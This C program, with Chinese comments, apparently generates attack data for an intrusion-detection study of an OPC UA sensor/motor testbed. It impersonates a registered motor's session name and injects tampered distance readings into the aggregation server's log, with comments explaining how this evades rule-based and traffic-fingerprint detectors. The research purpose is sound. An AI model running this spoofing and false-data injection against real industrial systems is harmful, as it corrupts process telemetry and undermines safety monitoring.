// =============================================================================
// 進階攻擊：被入侵的合法節點（compromised_node）
// =============================================================================
// 動機（來自 net/GNN_DATASET.md 的分析）：
//   目前四種攻擊在網路層都是「多出一個匿名 client」，所以：
//     - `SourceNode==null` 規則一條就能抓（匿名 → null）
//     - 不用圖的 RandomForest 也能 PR-AUC 1.000（攻擊者流量指紋明顯）
//   這讓「GNN 有沒有價值」根本無從驗證 —— 因為任務太簡單。
//
//   本攻擊模擬**憑證/身分被竊的合法節點**：攻擊者用一個**已註冊的 session 名**
//   （MotorSource2）連線，行為上仍是個正常的 motor（訂閱 sensor、每秒回報），
//   但**內容被竄改**（回報與 sensor 實際送出不符的距離值）。
//
//   關鍵後果 —— 這正是要證明的點：
//     1. SourceNode 不再是 null（伺服器蓋上合法的 ns=1;s=MotorSource2）
//        → **`SourceNode==null` 規則完全失效（recall=0）**
//     2. 連線結構完全正常（就是三台 motor 之一，不多不少）
//        → **「多一個節點/一條邊」的訊號消失**
//     3. 每秒流量與正常 motor 一致
//        → **RandomForest 的流量指紋失效**
//
//   破綻只剩「這台 motor 回報的值，與 sensor 實際送出的值對不上」——
//   這是**跨節點的語意/物理一致性**，正是圖結構（motor↔sensor 的關係）
//   才看得到的維度。若 GNN 能抓到這個而規則/RF 抓不到，就證明了 GNN 的價值。
//
// ground truth：被竄改的回報在訊息尾端埋 " #MAL" 記號（僅供評估）。
//
// 用法： ./compromised_node_attack [session_name]   預設 MotorSource2
//   —— 冒用哪個合法身分。必須是 aggregation_server SOURCE_REGISTRY 裡有的名字。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>
#include <open62541/client_subscriptions.h>

#ifndef BASELINE_SEC
#define BASELINE_SEC    300
#endif
#ifndef N_TAMPER
#define N_TAMPER        20     // 有幾秒回報被竄改的值（其餘秒回報正常）
#endif
// ⚠️ 大小對齊（2026-08-09 修）：ground truth 記號會改變寫入行的長度，
//    而長度直接反映在 pcap 的 bytes_c2s 上 —— 實測 compromised 場景惡意秒的
//    bytes_c2s 中位數比正常秒**正好多 5 bytes**（= " #MAL" 的長度），於是
//    「無圖無值 RF」在 random 切分下拿到 PR-AUC 1.000：它抓到的是**評估記號**，
//    不是攻擊。修法：正常秒補一個等長的良性記號 " #BEN"，兩類行等長，
//    記號在網路層完全不可見（偵測器仍看不到記號，read_log 只認 #MAL）。
#define MAL_MARK        " #MAL"
#define BEN_MARK        " #BEN"   // 與 MAL_MARK 等長的填充，消除大小指紋

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

static char g_session[64] = "MotorSource2";
static double g_last_sensor = -1.0;    // 最近一次從 sensor 收到的真實距離

// 回報所需的共享狀態（在 onDistance 回呼裡使用，見下方說明）
static UA_Client *g_logCli = NULL;     // 寫 log 到 aggregation_server 的連線
static time_t     g_start  = 0;        // 攻擊起始時間
static int       *g_is_tamper = NULL;  // 每秒是否竄改
static int        g_baseline = 0;
static int        g_last_reported = -1;// 上一個已回報的秒（每秒最多回報一次）
static int        g_n_tamper = 0;

static void build_log(char *out, size_t n, const char *msg) {
    UA_DateTimeStruct t = UA_DateTime_toStruct(UA_DateTime_now());
    snprintf(out, n, "[%04u-%02u-%02u %02u:%02u:%02u.%03u (UTC)] info/application\t%s",
             t.year, t.month, t.day, t.hour, t.min, t.sec, t.milliSec, msg);
}

static void write_log(UA_Client *c, const char *line) {
    UA_Variant v; UA_String s = UA_STRING((char *)line);
    UA_Variant_setScalar(&v, &s, &UA_TYPES[UA_TYPES_STRING]);
    UA_Client_writeValueAttribute(c, UA_NODEID_STRING(1, "CentralLogIn"), &v);
}

// 訂閱 sensor 的 DistanceValue。
// ⚠️ 同步修正（項目 B，第二版）：真 motor 是**在收到通知的回呼裡立刻回報**收到的
//   那個值（見 motor_sub.c onDistance → "[Motor] Received distance"）。先前把回報搬到
//   主迴圈的 wall-clock tick 會與訂閱去同步 → 正常秒的值也落後真 motor 一格，被跨節點
//   一致性特徵誤判、也讓 RF 撿到不該有的每秒指紋。本版**在回呼內直接回報**，與真
//   motor 逐值對齊：正常秒回報的值與真 motor 完全相同（dev≈0），只有竄改秒才偏離。
//   格式也對齊真 motor 的 "%.1f"。
static void onDistance(UA_Client *c, UA_UInt32 subId, void *subCtx,
                       UA_UInt32 monId, void *monCtx, UA_DataValue *v) {
    (void)c; (void)subId; (void)subCtx; (void)monId; (void)monCtx;
    if (!(v->hasValue && UA_Variant_hasScalarType(&v->value, &UA_TYPES[UA_TYPES_DOUBLE])))
        return;
    double sensor = *(UA_Double *)v->value.data;
    g_last_sensor = sensor;

    int el = (int)(time(NULL) - g_start);
    if (el < 0 || el >= g_baseline) return;
    if (el == g_last_reported) return;      // 每秒最多回報一次（與真 motor 節奏一致）
    g_last_reported = el;

    char line[1024], msg[256];
    if (g_is_tamper[el]) {
        // 竄改：回報一個與 sensor 真實值明顯不同的距離（真值 ± 20，仍落在合法量程內）
        double tampered = sensor > 26 ? sensor - 20 : sensor + 20;
        snprintf(msg, sizeof(msg), "[Motor] Received distance: %.1f cm%s", tampered, MAL_MARK);
        g_n_tamper++;
        printf("[COMPROMISED] t=%ds TAMPER: sensor=%.3g reported=%.3g\n", el, sensor, tampered);
    } else {
        // 正常秒：如實回報收到的 sensor 值（跟真 motor 一模一樣，逐值對齊）
        snprintf(msg, sizeof(msg), "[Motor] Received distance: %.1f cm%s", sensor, BEN_MARK);
    }
    build_log(line, sizeof(line), msg);
    if (g_logCli) write_log(g_logCli, line);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IOLBF, 0);
    signal(SIGINT, stopHandler); signal(SIGTERM, stopHandler);
    if (argc > 1) snprintf(g_session, sizeof(g_session), "%s", argv[1]);

    // === 關鍵：用「已註冊的合法 session 名」連線（模擬憑證被竊）===
    // 一個是連 sensor 訂閱距離（當個正常 motor），一個是寫 log 到彙整伺服器。
    UA_Client *sensorCli = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(sensorCli));

    UA_Client *logCli = UA_Client_new();
    UA_ClientConfig *lc = UA_Client_getConfig(logCli);
    UA_ClientConfig_setDefault(lc);
    UA_String_clear(&lc->sessionName);
    lc->sessionName = UA_STRING_ALLOC(g_session);   // ← 冒用合法身分

    printf("[COMPROMISED] Impersonating registered node '%s'\n", g_session);
    if (UA_Client_connect(sensorCli, "opc.tcp://127.0.0.1:4842") != UA_STATUSCODE_GOOD) {
        printf("[COMPROMISED] sensor connect failed\n"); return 1;
    }
    if (UA_Client_connect(logCli, "opc.tcp://127.0.0.1:4840") != UA_STATUSCODE_GOOD) {
        printf("[COMPROMISED] agg connect failed\n"); return 1;
    }

    // 訂閱 sensor 距離（跟真 motor 一樣）
    UA_CreateSubscriptionRequest sr = UA_CreateSubscriptionRequest_default();
    UA_CreateSubscriptionResponse srr =
        UA_Client_Subscriptions_create(sensorCli, sr, NULL, NULL, NULL);
    UA_UInt32 subId = srr.subscriptionId;
    UA_MonitoredItemCreateRequest mi =
        UA_MonitoredItemCreateRequest_default(UA_NODEID_STRING(1, "DistanceValue"));
    UA_Client_MonitoredItems_createDataChange(
        sensorCli, subId, UA_TIMESTAMPSTORETURN_BOTH, mi, NULL, onDistance, NULL);

    printf("[COMPROMISED] Behaving as a normal motor; %d seconds will report TAMPERED values.\n",
           N_TAMPER);
    srand((unsigned)time(NULL) ^ 0xBADC0DE);
    static int is_tamper[BASELINE_SEC]; memset(is_tamper, 0, sizeof(is_tamper));
    for (int i = 0; i < N_TAMPER; i++) is_tamper[rand() % BASELINE_SEC] = 1;

    // 把回報所需狀態交給 onDistance 回呼（回報在回呼內完成，與真 motor 同步）
    g_logCli = logCli;
    g_start = time(NULL);
    g_is_tamper = is_tamper;
    g_baseline = BASELINE_SEC;

    // 主迴圈只負責推進訂閱；實際回報發生在 onDistance 回呼裡（見上方說明）。
    while (running) {
        if ((int)(time(NULL) - g_start) >= BASELINE_SEC) break;
        UA_Client_run_iterate(sensorCli, 50);   // 收 sensor 通知 → 觸發 onDistance 回報
    }

    printf("[COMPROMISED] Done (%d tampered reports). Disconnecting.\n", g_n_tamper);
    UA_Client_disconnect(sensorCli); UA_Client_delete(sensorCli);
    UA_Client_disconnect(logCli); UA_Client_delete(logCli);
    return 0;
}
